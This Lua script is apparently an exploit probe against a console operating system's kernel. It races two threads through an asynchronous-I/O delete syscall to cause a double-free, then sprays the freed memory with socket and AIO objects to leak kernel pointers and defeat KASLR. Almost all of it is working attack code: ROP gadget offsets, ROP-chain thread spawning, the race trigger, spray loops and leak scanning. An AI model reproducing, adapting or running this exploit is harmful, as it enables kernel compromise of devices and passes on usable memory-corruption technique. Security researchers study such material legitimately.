-- CRASH_CLASS: MODERATE
-- PROBE 66c: AIO double-free with cross-type spray for kernel pointer leak
--
-- The 13.60 decompile shows 662's delete path frees a 48-byte (0x30)
-- completion record via func_0x00c08df0 (free) at zone 0x1ab59e0.
-- The TOCTOU race in 662 makes both threads free the same 48B block →
-- it goes on the 64-byte malloc free list TWICE.
--
-- After the double-free, the same address can be allocated twice:
--   alloc1 → gets the block (removes first free-list entry)
--   alloc2 → gets the SAME block (removes second entry)
-- Now two kernel objects share the same memory.
--
-- The completion record at offset +8 stores *(td+8) = thread pointer
-- (a kernel address). If we reclaim with a different object type and
-- read that object, we leak the kernel pointer → KASLR defeat.
--
-- This probe:
-- A) Triggers the double-free via 662 (main + child, same as 65u)
-- B) Sprays with pipe/socket/shm/setsockopt allocations in 33-64B range
-- C) Submits new AIO requests to reclaim the other free-list entry
-- D) Checks AIO status output for unexpected values (kernel pointers)

print("=== PROBE 66c: AIO CROSS-TYPE SPRAY ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi2 = eb_hi
    if lo >= 0x100000000 then hi2 = hi2 + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi2
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)
local sf_lo, sf_hi = g_lohi(0x992)

-- Ignore SIGSYS
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- TCB for child threads
local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x400)
for i = 0, 0x3FC, 4 do wd(N(shared) + i, 0) end

-- Helper: spawn a child thread that calls 662(ids, count, states) then exits
local function spawn_662_child(ids_addr, count, states_addr, done_off)
    local CHILD_STK = 0x800
    local cstk = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cstk) + i, 0) end
    local cbase = N(cstk)
    local sp = ((cbase + CHILD_STK) - ((cbase + CHILD_STK) % 16)) - 8

    local function push(val) wq(sp, val); sp = sp + 8 end

    -- sysarch(SET_FSBASE)
    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- 662(ids, count, states)
    push(pop_rax_ret); push(uint64(662))
    push(pop_rdi_ret); push(uint64(ids_addr))
    push(pop_rsi_ret); push(uint64(count))
    push(pop_rdx_ret); push(uint64(states_addr))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- Store return value
    push(pop_rdi_ret); push(uint64(N(shared) + done_off + 8))
    push(mov_rdi_rax)

    -- Done marker
    push(pop_rdi_ret); push(uint64(N(shared) + done_off))
    push(pop_rax_ret); push(uint64(0xDDDD))
    push(mov_rdi_rax)

    -- Exit
    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared) + done_off, 0)

    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, cbase % 0x100000000, math.floor(cbase / 0x100000000))
    w64(N(pa) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)
end

-- [A] Trigger double-free: submit IDs, poll, then race 662 from main + child
print("")
print("-- A: AIO double-free + cross-type spray --")

local BATCH = 16
local ITERS = 5
local kptr_found = 0

for iter = 1, ITERS do
    -- Submit AIO requests individually via 669
    local ids = memory.alloc(BATCH * 4)
    local id_vals = {}
    for i = 0, BATCH - 1 do
        local reqbuf = memory.alloc(0x28)
        for j = 0, 0x24, 4 do wd(N(reqbuf) + j, 0) end
        wd(N(reqbuf), 1)  -- cmd=1 (read)
        local id_out = memory.alloc(8)
        wq(id_out, uint64(0xFFFFFFFF))
        local ok, rv = pcall(function()
            return mk(669)(uint64(N(reqbuf)), uint64(1), uint64(1), uint64(N(id_out)))
        end)
        local got_id = rd(N(id_out)) or 0xFFFFFFFF
        if got_id ~= 0xFFFFFFFF then
            wd(N(ids) + i * 4, got_id)
            id_vals[#id_vals + 1] = got_id
        end
    end

    repeat -- break-out block (no goto in Lua 5.1)
    if #id_vals < BATCH then
        print(string.format("[%d] only got %d IDs, skip", iter, #id_vals))
        break
    end

    -- Poll all IDs via 664 (prerequisite for delete)
    local poll_states = memory.alloc(BATCH * 4)
    pcall(function()
        mk(664)(uint64(N(ids)), uint64(BATCH), uint64(N(poll_states)))
    end)

    -- Race: main thread + child both call 662 on the same IDs
    local main_states = memory.alloc(BATCH * 4)
    local child_states = memory.alloc(BATCH * 4)
    for i = 0, BATCH * 4 - 1, 4 do
        wd(N(main_states) + i, 0xCD)
        wd(N(child_states) + i, 0xCD)
    end

    -- Launch child to call 662
    spawn_662_child(N(ids), BATCH, N(child_states), 0x100)

    -- Main thread IMMEDIATELY calls 662 on same IDs
    pcall(function()
        mk(662)(uint64(N(ids)), uint64(BATCH), uint64(N(main_states)))
    end)

    -- Wait for child
    local dummy = 0
    for w = 1, 200000 do dummy = dummy + 1 end

    -- Count doubles
    local doubles = 0
    for i = 0, BATCH - 1 do
        local ms = rd(N(main_states) + i * 4) or 0xCD
        local cs = rd(N(child_states) + i * 4) or 0xCD
        if ms == 0 and cs == 0 then doubles = doubles + 1 end
    end

    -- ★ CROSS-TYPE SPRAY: create kernel objects in the 64-byte zone
    -- Strategy: pipe(42) may not work, so use socketpair + setsockopt
    -- Each setsockopt with SO_LINGER allocates a small buffer
    -- Also try shm_open to create VM objects

    -- Spray 1: Create many socketpairs (each creates kernel file structures)
    local spray_fds = {}
    for s = 1, 32 do
        local spbuf = memory.alloc(8)
        wd(N(spbuf), 0xFFFF); wd(N(spbuf) + 4, 0xFFFF)
        local ok, rv = pcall(function()
            return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spbuf)))
        end)
        if ok and N(rv) == 0 then
            spray_fds[#spray_fds + 1] = rd(N(spbuf)) or -1
            spray_fds[#spray_fds + 1] = rd(N(spbuf) + 4) or -1
        end
    end

    -- Spray 2: setsockopt on each socket with various options
    -- Each setsockopt may allocate option-specific kernel buffers
    for _, fd in ipairs(spray_fds) do
        if fd >= 0 then
            local optbuf = memory.alloc(64)
            for j = 0, 60, 4 do wd(N(optbuf) + j, 0x41414141) end
            -- SO_LINGER = 0x80, struct linger = 8 bytes
            pcall(function()
                mk(105)(uint64(fd), uint64(0xFFFF), uint64(0x80),
                    uint64(N(optbuf)), uint64(8))
            end)
        end
    end

    -- Spray 3: Submit NEW AIO requests to reclaim from the other free-list entry
    local spray_ids = memory.alloc(32 * 4)
    local spray_count = 0
    for s = 0, 31 do
        local reqbuf = memory.alloc(0x28)
        for j = 0, 0x24, 4 do wd(N(reqbuf) + j, 0) end
        wd(N(reqbuf), 1)
        local id_out = memory.alloc(8)
        wq(id_out, uint64(0xFFFFFFFF))
        pcall(function()
            mk(669)(uint64(N(reqbuf)), uint64(1), uint64(1), uint64(N(id_out)))
        end)
        local got = rd(N(id_out)) or 0xFFFFFFFF
        if got ~= 0xFFFFFFFF then
            wd(N(spray_ids) + spray_count * 4, got)
            spray_count = spray_count + 1
        end
    end

    -- Read back AIO status for spray IDs — look for kernel pointers in status
    local spray_states = memory.alloc(spray_count * 4 + 16)
    for i = 0, spray_count * 4 - 1, 4 do wd(N(spray_states) + i, 0xBB) end
    if spray_count > 0 then
        pcall(function()
            mk(664)(uint64(N(spray_ids)), uint64(spray_count), uint64(N(spray_states)))
        end)
    end

    -- Scan spray states for anything unusual (kernel pointers)
    local unusual = 0
    for i = 0, spray_count - 1 do
        local st = rd(N(spray_states) + i * 4) or 0xBB
        if st ~= 0 and st ~= 0xBB and st ~= 0x80020003 and st ~= 0x80020010 then
            unusual = unusual + 1
            local sh = math.floor(st / 0x10000)
            if sh >= 0xFFFF8000 and sh ~= 0xFFFFFFFF then
                kptr_found = kptr_found + 1
                print(string.format("  [%d] ★ KPTR in status[%d]: 0x%08X", iter, i, st))
            elseif unusual <= 3 then
                print(string.format("  [%d] unusual status[%d]: 0x%08X", iter, i, st))
            end
        end
    end

    -- Read 8 bytes at each spray state offset to catch qword-aligned kptrs
    -- 662/664 return dword status, but if the freed block was reclaimed by
    -- a completion record whose +0 overlaps our status output, the qword at
    -- the status address might include the kernel thread pointer at +8
    for i = 0, math.min(spray_count - 1, 15) do
        local hi_word = rd(N(spray_states) + i * 4 + 4) or 0
        if hi_word >= 0xFFFF8000 and hi_word ~= 0xFFFFFFFF then
            kptr_found = kptr_found + 1
            local lo_word = rd(N(spray_states) + i * 4) or 0
            print(string.format("  [%d] ★ KPTR at states+%d: %08X_%08X",
                iter, i * 4, hi_word, lo_word))
        end
    end

    -- Cleanup spray
    if spray_count > 0 then
        pcall(function()
            mk(662)(uint64(N(spray_ids)), uint64(spray_count), uint64(N(spray_states)))
        end)
    end
    for _, fd in ipairs(spray_fds) do
        if fd >= 0 then pcall(function() mk(6)(uint64(fd)) end) end
    end

    print(string.format("[%d] dbl=%d spray_fds=%d spray_aio=%d unusual=%d kptr=%d",
        iter, doubles, #spray_fds, spray_count, unusual, kptr_found))

    until true -- end break-out block
end

print(string.format("\nTOTAL kptr found: %d", kptr_found))
print("alive=" .. (N(native.fcall_with_rax(stub, 20)) == pid_val and "YES" or "NO"))
print("=== 66c DONE ===")
